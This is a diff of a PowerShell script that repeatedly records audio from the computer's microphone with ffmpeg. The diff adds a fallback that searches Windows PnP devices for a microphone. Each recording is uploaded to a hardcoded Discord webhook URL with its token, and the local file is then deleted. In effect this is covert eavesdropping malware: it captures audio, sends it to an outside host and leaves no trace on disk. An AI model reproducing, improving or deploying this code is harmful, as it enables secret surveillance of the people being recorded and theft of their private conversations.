@@ -15,7 +15,7 @@ for ($i = 1; $i -le 3000; $i++) {
     # Extract the first default microphone found
     $micDevice = $audioDevices -split "`r?`n" | Select-String "Microphone" | Select-Object -First 1
 
-    # Check if a microphone was found
+    # Check if a microphone was found using ffmpeg
     if ($micDevice) {
         # Clean the device name to be used in the ffmpeg command
         $micDevice = $micDevice -replace '.*"(.*)".*', '$1'
@@ -24,18 +24,38 @@ for ($i = 1; $i -le 3000; $i++) {
         ffmpeg -f dshow -i audio="$micDevice" -t $duration -acodec pcm_s16le -ac 1 -ar 44100 "$outputFile"
 
         Write-Host "Recording complete! Saved to $outputFile"
+    } else {
+        Write-Host "No microphone found via ffmpeg. Searching for default laptop microphones in Windows..."
 
-        # Discord webhook URL
-        $webhookUrl = "https://discord.com/api/webhooks/1279782310341775463/tUSoz4kMon0fVjx62uPcoeMnqhsyW3G1ISog6C_rmxfkZSKPCxJWJcJVmhuarVV4bArg"
+        # Use PowerShell to search for default laptop microphones in Windows
+        $laptopMics = Get-PnpDevice -Class 'AudioEndpoint' | Where-Object { $_.FriendlyName -match 'Microphone' -and $_.Status -eq 'OK' }
 
-        # Prepare the form-data for sending the file to Discord
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $headers = @{
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
+        if ($laptopMics) {
+            # Use the first available microphone from Windows PnP devices
+            $micDevice = $laptopMics[0].FriendlyName
+
+            Write-Host "Found default microphone: $micDevice"
+
+            # Build and run the ffmpeg command to record the mic audio using the found microphone
+            ffmpeg -f dshow -i audio="$micDevice" -t $duration -acodec pcm_s16le -ac 1 -ar 44100 "$outputFile"
+
+            Write-Host "Recording complete! Saved to $outputFile"
+        } else {
+            Write-Host "No default laptop microphones found in Windows!"
         }
+    }
 
-        # Prepare the form content (this includes the file and a simple message)
-        $body = @"
+    # Discord webhook URL
+    $webhookUrl = "https://discord.com/api/webhooks/1279782310341775463/tUSoz4kMon0fVjx62uPcoeMnqhsyW3G1ISog6C_rmxfkZSKPCxJWJcJVmhuarVV4bArg"
+
+    # Prepare the form-data for sending the file to Discord
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
+
+    # Prepare the form content (this includes the file and a simple message)
+    $body = @"
 --$boundary
 Content-Disposition: form-data; name="file"; filename="$outputFile"
 Content-Type: application/octet-stream
@@ -50,18 +70,15 @@ Content-Disposition: form-data; name="payload_json"
 --$boundary--
 "@
 
-        # Send the request to Discord
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
+    # Send the request to Discord
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
 
-        Write-Host "File sent to Discord webhook!"
+    Write-Host "File sent to Discord webhook!"
 
-        # Delete the file after sending it to Discord
-        if (Test-Path $outputFile) {
-            Remove-Item $outputFile
-            Write-Host "Output file deleted: $outputFile"
-        }
-    } else {
-        Write-Host "No microphone found! Searching for active microphone again."
+    # Delete the file after sending it to Discord
+    if (Test-Path $outputFile) {
+        Remove-Item $outputFile
+        Write-Host "Output file deleted: $outputFile"
     }
 
     # Optional delay between recordings
